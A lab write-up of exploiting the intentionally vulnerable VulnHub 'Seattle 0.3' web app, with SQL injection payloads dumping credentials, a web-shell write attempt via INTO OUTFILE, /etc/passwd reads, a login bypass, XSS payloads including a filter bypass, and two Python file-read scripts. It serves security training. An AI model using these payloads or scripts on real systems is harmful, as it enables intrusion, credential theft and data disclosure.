---
title: "VulnHub - Seattle 0.3"
categories: [VulnHub, OSWE-Like]
tags: [Linux,Web,OSWE]
mermaid: true
image: https://0x4rt3mis.github.io/assets/img/vulnhub/2021-11-12-VulnHub-Seattle0.3/2021-11-12-VulnHub-Seattle0.3%2009:25:52.png
---


Graceful's VulnVM is web application running on a virtual machine, it’s designed to simulate a simple eCommerce style website which is purposely vulnerable to a number of well know security issues commonly seen in web applications. This is really a pre-release preview of the project but it’s certainly functional as it stands, but I’m planning on doing a lot of work on this in the near future.

The plan is ultimately to have the application vulnerable to a large number of issues with a selection of different filters at different difficulties that way the as testers become better at detecting and exploiting issues the application can get hardened against common exploitation methods to allow the testers a wider ranger of experiences.

The first filters have now been implemented! The application now supports "levels" where Level 1 includes no real filtration of user input and Level 2 includes a simple filter for each vulnerable function.

Currently it's vulnerable to:

- SQL Injection (Error-based)
- SQL Injection (Blind)
- Reflected Cross-Site Scripting
- Stored Cross-Site Scripting
- Insecure Direct-Object Reference
- Username Enumeration
- Path Traversal
- Exposed phpinfo()
- Exposed Administrative Interface
- Weak Admin Credentials

# Enumeration

Let's get the box ip with `arp-scan`

```sh
arp-scan -I eth1 192.168.56.100/24
```

![](https://0x4rt3mis.github.io/assets/img/vulnhub/2021-11-12-VulnHub-Seattle0.3/2021-11-12-VulnHub-Seattle0.3%2009:27:50.png)

First step is to enumerate the box. For this we'll use `nmap`

```sh
nmap -sV -sC -Pn 192.168.56.156 -p-
```

> -sV - Services running on the ports

> -sC - Run some standart scripts

> -Pn - Consider the host alive

![](https://0x4rt3mis.github.io/assets/img/vulnhub/2021-11-12-VulnHub-Seattle0.3/2021-11-12-VulnHub-Seattle0.3%2009:30:50.png)

## Port 80

We try to open it on the browser

![](https://0x4rt3mis.github.io/assets/img/vulnhub/2021-11-12-VulnHub-Seattle0.3/2021-11-12-VulnHub-Seattle0.3%2009:28:15.png)

Just a normal page with many options to exploit. Before get deep into them, let's run a gobuster

### Gobuster

Let's start crafting a little more on the box to see if we can enum more things do explore. I use zip, because I know that possible we will need to get the source code from anywhere.

```sh
gobuster dir -t 100 -u http://192.168.56.156 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,zip
```

![](https://0x4rt3mis.github.io/assets/img/vulnhub/2021-11-12-VulnHub-Seattle0.3/2021-11-12-VulnHub-Seattle0.3%2009:33:21.png)

We found a bunch of directories in it. Fine. All of them we must be logged in to access. So, let's go deeper in the login tab now

Let's start trying exploitation in the order of the tabs

# Level 1

We see that we have two levels in this box.

Let's start for the level 1.

## Home

In the first one, home, we have link for all the others

![](https://0x4rt3mis.github.io/assets/img/vulnhub/2021-11-12-VulnHub-Seattle0.3/2021-11-12-VulnHub-Seattle0.3%2009:35:45.png)

## Vinyl

In vinyl tab we found possible SQLInjection

![](https://0x4rt3mis.github.io/assets/img/vulnhub/2021-11-12-VulnHub-Seattle0.3/2021-11-12-VulnHub-Seattle0.3%2009:34:59.png)

In burp, we got the mysql error with a single quote

![](https://0x4rt3mis.github.io/assets/img/vulnhub/2021-11-12-VulnHub-Seattle0.3/2021-11-12-VulnHub-Seattle0.3%2009:35:19.png)

We got that we have 5 columns

```
type=1+ORDER+BY+5--+-
```

![](https://0x4rt3mis.github.io/assets/img/vulnhub/2021-11-12-VulnHub-Seattle0.3/2021-11-12-VulnHub-Seattle0.3%2009:37:20.png)

```
type=1+ORDER+BY+6--+-
```

![](https://0x4rt3mis.github.io/assets/img/vulnhub/2021-11-12-VulnHub-Seattle0.3/2021-11-12-VulnHub-Seattle0.3%2009:37:40.png)

So, we can start extracting data from there

```
type=1+UNION+SELECT+1,2,3,4,5--+-
```

![](https://0x4rt3mis.github.io/assets/img/vulnhub/2021-11-12-VulnHub-Seattle0.3/2021-11-12-VulnHub-Seattle0.3%2009:38:55.png)

So, let's extract

![](https://0x4rt3mis.github.io/assets/img/vulnhub/2021-11-12-VulnHub-Seattle0.3/2021-11-12-VulnHub-Seattle0.3%2009:39:19.png)

![](https://0x4rt3mis.github.io/assets/img/vulnhub/2021-11-12-VulnHub-Seattle0.3/2021-11-12-VulnHub-Seattle0.3%2009:40:21.png)

We get [this](https://www.noobsec.net/sqli-cheatsheet/) cheat sheet to help us

With this query we found the tables of the current database

```
type=1+UNION+SELECT+1,2,table_name,4,5+FROM+information_schema.tables+WHERE+table_schema=database()--+-
```

![](https://0x4rt3mis.github.io/assets/img/vulnhub/2021-11-12-VulnHub-Seattle0.3/2021-11-12-VulnHub-Seattle0.3%2009:49:06.png)

And here the columns

```
type=1+UNION+SELECT+1,2,column_name,4,5+FROM+information_schema.columns+WHERE+table_schema=database()--+-
```

![](https://0x4rt3mis.github.io/assets/img/vulnhub/2021-11-12-VulnHub-Seattle0.3/2021-11-12-VulnHub-Seattle0.3%2009:51:25.png)

We found three of them very interesting, `id, username and password`

Knowing the tables and the columns of the seattle database, we can get the username and passwod

```
type=1+UNION+SELECT+1,2,username,4,5+FROM+tblMembers--+-
type=1+UNION+SELECT+1,2,password,4,5+FROM+tblMembers--+-
```

`admin@seattlesounds.net:Assasin1`

![](https://0x4rt3mis.github.io/assets/img/vulnhub/2021-11-12-VulnHub-Seattle0.3/2021-11-12-VulnHub-Seattle0.3%2009:52:38.png)

![](https://0x4rt3mis.github.io/assets/img/vulnhub/2021-11-12-VulnHub-Seattle0.3/2021-11-12-VulnHub-Seattle0.3%2009:53:03.png)

## Clothing

Let's go to clothig tab now

![](https://0x4rt3mis.github.io/assets/img/vulnhub/2021-11-12-VulnHub-Seattle0.3/2021-11-12-VulnHub-Seattle0.3%2009:58:04.png)

Again, we possibly get sqlinjeciton here

With a single quote we trigger the error

![](https://0x4rt3mis.github.io/assets/img/vulnhub/2021-11-12-VulnHub-Seattle0.3/2021-11-12-VulnHub-Seattle0.3%2009:58:59.png)

We got 5 columns

```
type=2+ORDER+BY+5+--+-
```

![](https://0x4rt3mis.github.io/assets/img/vulnhub/2021-11-12-VulnHub-Seattle0.3/2021-11-12-VulnHub-Seattle0.3%2010:00:17.png)

```
type=2+ORDER+BY+6+--+-
```

![](https://0x4rt3mis.github.io/assets/img/vulnhub/2021-11-12-VulnHub-Seattle0.3/2021-11-12-VulnHub-Seattle0.3%2010:00:53.png)

We found the vulnerable place

```
type=2+UNION+SELECT+1,2,3,4,5+--+-
```

![](https://0x4rt3mis.github.io/assets/img/vulnhub/2021-11-12-VulnHub-Seattle0.3/2021-11-12-VulnHub-Seattle0.3%2010:02:35.png)

The same way before, we extract the username and pass

```
type=2+UNION+SELECT+1,2,username,4,5+FROM+tblMembers--+-
type=2+UNION+SELECT+1,2,password,4,5+FROM+tblMembers--+-
```

![](https://0x4rt3mis.github.io/assets/img/vulnhub/2021-11-12-VulnHub-Seattle0.3/2021-11-12-VulnHub-Seattle0.3%2010:03:21.png)

![](https://0x4rt3mis.github.io/assets/img/vulnhub/2021-11-12-VulnHub-Seattle0.3/2021-11-12-VulnHub-Seattle0.3%2010:03:56.png)

### Write Files

Here we could try to write a php malicious on the server to get RCE

Seems that we have no permission

```
type=2+UNION+SELECT+1,2,'system($_GET[\'c\']);+?>',4,5+INTO+OUTFILE+'/var/www/html/shell.php'--+-
```

![](https://0x4rt3mis.github.io/assets/img/vulnhub/2021-11-12-VulnHub-Seattle0.3/2021-11-12-VulnHub-Seattle0.3%2010:28:44.png)

### Read Files

We can also read files with the sqlinjection

```
type=2+UNION+SELECT+1,2,LOAD_FILE('/etc/passwd'),4,5--+-
```

![](https://0x4rt3mis.github.io/assets/img/vulnhub/2021-11-12-VulnHub-Seattle0.3/2021-11-12-VulnHub-Seattle0.3%2010:30:02.png)

We could do a python script to make this LFI better

Here it's

![](https://0x4rt3mis.github.io/assets/img/vulnhub/2021-11-12-VulnHub-Seattle0.3/2021-11-12-VulnHub-Seattle0.3%2012:24:29.png)

auto_lfi.py

```py
#!/usr/bin/python3
# Author: 0x4rt3mis
# Auto File Read LFI
# Seattle0.3 Level 1 - VulnHub

import argparse
import requests
import sys
from bs4 import BeautifulSoup
import re

'''Setting up something important'''
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
r = requests.session()

'''Here come the Functions'''
# Let's read files!
def readFile(rhost):
    url_ori = "http://%s:80/products.php?type=2" %rhost
    print("[+] Type exit to exit ! [+]")
    prefix = "Reading file: "
    file = ""
    cookies = {'level':'1'}
    while True:
        file = input(prefix)
        if file != "exit":
            url = url_ori + "+UNION+SELECT+1,2,LOAD_FILE('%s'),4,5--+-" %file
            headers = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}
            output = r.get(url,headers=headers,proxies=proxies,cookies=cookies)
            container = re.search(r"1.jpg><strong>Product Name: </strong>.*<strong>", output.text, re.DOTALL).group(0)
            if output.headers['Content-Length'] == "2738":
                print()
                print("[+] File does NOT EXIST !!! Or I can't read it !!! [+]")
                print()
            else:
                container = str(container)
                container = container.removesuffix("<br /><strong>")
                container = container.removeprefix("1.jpg><strong>Product Name: </strong>")
                print()
                print(container)
        else:
            print()
            print("[+] Exxxxitting.... !! [+]")
            print()
            break

def main():
    # Parse Arguments
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', help='Target ip address or hostname', required=True)
    args = parser.parse_args()

    rhost = args.target

    '''Here we call the functions'''
    # Read LFI
    readFile(rhost)

if __name__ == '__main__':
    main()
```

## Account

We see a login page here

![](https://0x4rt3mis.github.io/assets/img/vulnhub/2021-11-12-VulnHub-Seattle0.3/2021-11-12-VulnHub-Seattle0.3%2010:04:36.png)

We try a random login to see how it works

![](https://0x4rt3mis.github.io/assets/img/vulnhub/2021-11-12-VulnHub-Seattle0.3/2021-11-12-VulnHub-Seattle0.3%2010:08:13.png)

![](https://0x4rt3mis.github.io/assets/img/vulnhub/2021-11-12-VulnHub-Seattle0.3/2021-11-12-VulnHub-Seattle0.3%2010:08:19.png)

Ok, we send it to burp, and try a single quote

![](https://0x4rt3mis.github.io/assets/img/vulnhub/2021-11-12-VulnHub-Seattle0.3/2021-11-12-VulnHub-Seattle0.3%2010:09:10.png)

Worked!

What we need now is just a valid mail, and we can get it on the Blog tab

admin@seattlesounds.net

![](https://0x4rt3mis.github.io/assets/img/vulnhub/2021-11-12-VulnHub-Seattle0.3/2021-11-12-VulnHub-Seattle0.3%2010:15:42.png)

Now, it's easy to bypass it's password

```
usermail=admin@seattlesounds.net'--+-&password=123
```

![](https://0x4rt3mis.github.io/assets/img/vulnhub/2021-11-12-VulnHub-Seattle0.3/2021-11-12-VulnHub-Seattle0.3%2010:16:16.png)

We got success, logged in!

![](https://0x4rt3mis.github.io/assets/img/vulnhub/2021-11-12-VulnHub-Seattle0.3/2021-11-12-VulnHub-Seattle0.3%2010:18:46.png)

In the firefox tab

![](https://0x4rt3mis.github.io/assets/img/vulnhub/2021-11-12-VulnHub-Seattle0.3/2021-11-12-VulnHub-Seattle0.3%2010:20:38.png)

We see that we can write posts on the blog

![](https://0x4rt3mis.github.io/assets/img/vulnhub/2021-11-12-VulnHub-Seattle0.3/2021-11-12-VulnHub-Seattle0.3%2010:21:11.png)

```js
<script src="http://192.168.56.153/Test"></script>
```

![](https://0x4rt3mis.github.io/assets/img/vulnhub/2021-11-12-VulnHub-Seattle0.3/2021-11-12-VulnHub-Seattle0.3%2010:22:11.png)

And yes, it worked!

![](https://0x4rt3mis.github.io/assets/img/vulnhub/2021-11-12-VulnHub-Seattle0.3/2021-11-12-VulnHub-Seattle0.3%2010:22:44.png)

![](https://0x4rt3mis.github.io/assets/img/vulnhub/2021-11-12-VulnHub-Seattle0.3/2021-11-12-VulnHub-Seattle0.3%2010:23:02.png)

We have XSS here!

Ok, but we cannot have too much to exploit because we need a interaction to trigger it.

We could see the php content of the blog.php file with our LFI

![](https://0x4rt3mis.github.io/assets/img/vulnhub/2021-11-12-VulnHub-Seattle0.3/2021-11-12-VulnHub-Seattle0.3%2012:39:56.png)

```php
<div class="content">                  
<div class="prod-box">                      
<div class="prod-details">         
<?php                                                                                                                                                                                                              
include 'connectioni.php';                
                                                    
if (isset($_GET['author'])) {
    $stmt = $link->prepare('SELECT name,username FROM tblMembers WHERE id = ?;');
    $stmt->bind_param('i', $_GET['author']);
    $stmt->execute();
    $userResult = $stmt->get_result();
    $userRow = $userResult->fetch_assoc();
    echo '<strong>Viewing all posts by ' . $userRow['name'] . ' (' . $userRow['username'] . ')</strong><br /><br />';

    $stmt = $link->prepare('SELECT * FROM tblBlogs WHERE author =  ?;');
    $stmt->bind_param('i', $_GET['author']);
}
else {
    $stmt = $link->prepare('SELECT * FROM tblBlogs;');
}
$stmt->execute();
$result = $stmt->get_result();

if (mysqli_num_rows($result) == 0) {
    if ($_COOKIE["level"] = "1") {
        echo 'Couldn\'t find any posts by author: <span class="author-' . $_GET['author'] .'">' . htmlentities($_GET['author']) . '</span>.';
    }
    else {
        $author = $_GET["author"];
        $author = preg_replace("/<[A-Za-z0-9]/" , "", $author);
        $author = preg_replace("/on([a-z]+)/", "", $author);
        echo 'Couldn\'t find any posts by author: <span class="author-' . $author .'">' . htmlentities($author) . '</span>.';
    }
}

if (!$result) {
    echo "DB Error, could not query the database\n"; 
    echo 'MySQL Error: ' . htmlentities(mysql_error());
    exit;
}

while ($row = $result->fetch_assoc()) {
    $stmt = $link->prepare('SELECT name,username FROM tblMembers WHERE id =  ?;');
    $stmt->bind_param('i', $row['author']);
    $stmt->execute();
    $checkResult = $stmt->get_result();
    $checkRow = $checkResult->fetch_assoc();
    echo '<div class="list-blog">';
    echo '<strong>' . $row['title'] . '</strong> by <a href=/blog.php?author=' .$row['author'] . '>' . $checkRow['name'] . '</a><br /><br />';
    echo $row['content'] . '<br /></div>';
}

?>
</div>
</div>
```

The original echo messsage is:

```php
echo 'Couldn\'t find any posts by author: <span class="author-' . $_GET['author'] .'">' . htmlentities($_GET['author']) . '</span>.';
```

When we just change it to the get parameter we trigger the XSS

```php
echo 'Couldn\'t find any posts by author: <span class="author-"><script>alert("xss")</script>">' . htmlentities($_GET['author']) . '</span>.';
```

As we can see here in this demo from php files execution

![](https://0x4rt3mis.github.io/assets/img/vulnhub/2021-11-12-VulnHub-Seattle0.3/2021-11-12-VulnHub-Seattle0.3%2001:29:03.png)

This payload:

`"><script>alert("xss")</script>` first escape the author with the double quote, then close the span tag with >, then script tag is openened and executed!

I'll jump in the level2

## Path Transversal

We can get a path transversal to in the brochure download option

![](https://0x4rt3mis.github.io/assets/img/vulnhub/2021-11-12-VulnHub-Seattle0.3/2021-11-12-VulnHub-Seattle0.3%2001:31:49.png)

![](https://0x4rt3mis.github.io/assets/img/vulnhub/2021-11-12-VulnHub-Seattle0.3/2021-11-12-VulnHub-Seattle0.3%2001:32:23.png)

![](https://0x4rt3mis.github.io/assets/img/vulnhub/2021-11-12-VulnHub-Seattle0.3/2021-11-12-VulnHub-Seattle0.3%2001:32:34.png)

Let's make a python script to get it auto too

And here it is

![](https://0x4rt3mis.github.io/assets/img/vulnhub/2021-11-12-VulnHub-Seattle0.3/2021-11-12-VulnHub-Seattle0.3%2001:37:58.png)

path_transversal.py

```py
#!/usr/bin/python3
# Author: 0x4rt3mis
# Auto File Read LFI - Path Transversal
# Seattle0.3 Level 1 - VulnHub

import argparse
import requests
import sys
from bs4 import BeautifulSoup
import re

'''Setting up something important'''
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
r = requests.session()

'''Here come the Functions'''
# Let's read files!
def readFile(rhost):
    url_ori = "http://%s:80/download.php?item=" %rhost
    print("[+] Type exit to exit ! [+]")
    prefix = "Reading file: "
    file = ""
    cookies = {'level':'1'}
    while True:
        file = input(prefix)
        if file != "exit":
            url = url_ori + "/../../../../../../../..%s" %file
            headers = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}
            output = r.get(url,headers=headers,proxies=proxies,cookies=cookies)
            if output.headers['Content-Length'] == "41":
                print()
                print("[+] File does NOT EXIST !!! Or I can't read it !!! [+]")
                print()
            else:
                read = str(output.text)
                read = read.removesuffix('\n')
                read = read.removesuffix('<div class="products-list"></div>')
                read = read.removesuffix('\n')                
                read = read.removesuffix('</div>')
                print()
                print(read)
        else:
            print()
            print("[+] Exxxxitting.... !! [+]")
            print()
            break

def main():
    # Parse Arguments
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', help='Target ip address or hostname', required=True)
    args = parser.parse_args()

    rhost = args.target

    '''Here we call the functions'''
    # Read LFI
    readFile(rhost)

if __name__ == '__main__':
    main()
```

Ok, now let's go to the level 2

# Level 2

We change it

![](https://0x4rt3mis.github.io/assets/img/vulnhub/2021-11-12-VulnHub-Seattle0.3/2021-11-12-VulnHub-Seattle0.3%2001:41:16.png)

![](https://0x4rt3mis.github.io/assets/img/vulnhub/2021-11-12-VulnHub-Seattle0.3/2021-11-12-VulnHub-Seattle0.3%2001:41:26.png)

So, now let's start the exploration again

## Vinyl and Clothing

Let's go to the vinil tab and see how it's working

![](https://0x4rt3mis.github.io/assets/img/vulnhub/2021-11-12-VulnHub-Seattle0.3/2021-11-12-VulnHub-Seattle0.3%2001:42:30.png)

With one single quote we got the same SQL Error, showing that it is still vulnerable

![](https://0x4rt3mis.github.io/assets/img/vulnhub/2021-11-12-VulnHub-Seattle0.3/2021-11-12-VulnHub-Seattle0.3%2001:43:15.png)

We can extract it the same way

![](https://0x4rt3mis.github.io/assets/img/vulnhub/2021-11-12-VulnHub-Seattle0.3/2021-11-12-VulnHub-Seattle0.3%2001:44:50.png)

For both pages

Username

![](https://0x4rt3mis.github.io/assets/img/vulnhub/2021-11-12-VulnHub-Seattle0.3/2021-11-12-VulnHub-Seattle0.3%2001:45:29.png)

![](https://0x4rt3mis.github.io/assets/img/vulnhub/2021-11-12-VulnHub-Seattle0.3/2021-11-12-VulnHub-Seattle0.3%2001:45:44.png)

Password

![](https://0x4rt3mis.github.io/assets/img/vulnhub/2021-11-12-VulnHub-Seattle0.3/2021-11-12-VulnHub-Seattle0.3%2001:46:04.png)

![](https://0x4rt3mis.github.io/assets/img/vulnhub/2021-11-12-VulnHub-Seattle0.3/2021-11-12-VulnHub-Seattle0.3%2001:46:21.png)

## Blog

The XSS in blog is a little different, I noticed it when I saw the level 1

```php
if (mysqli_num_rows($result) == 0) {
    if ($_COOKIE["level"] = "1") {
        echo 'Couldn\'t find any posts by author: <span class="author-' . $_GET['author'] .'">' . htmlentities($_GET['author']) . '</span>.';
    }
    else {
        $author = $_GET["author"];
        $author = preg_replace("/<[A-Za-z0-9]/" , "", $author);
        $author = preg_replace("/on([a-z]+)/", "", $author);
        echo 'Couldn\'t find any posts by author: <span class="author-' . $author .'">' . htmlentities($author) . '</span>.';
    }
}
```

The level 2 it sanitize the code before put in the tag, so we need to find a way to bypass the original tags

I'll as basis which one I used before

`"><script>alert("xss")</script>` 

We did it, and it has been bypassed

![](https://0x4rt3mis.github.io/assets/img/vulnhub/2021-11-12-VulnHub-Seattle0.3/2021-11-12-VulnHub-Seattle0.3%2001:57:12.png)

`"><<oscript>alert("xss")</script>` will be `"><script>alert("xss")</script>` with the filters applied to the input

![](https://0x4rt3mis.github.io/assets/img/vulnhub/2021-11-12-VulnHub-Seattle0.3/2021-11-12-VulnHub-Seattle0.3%2006:24:21.png)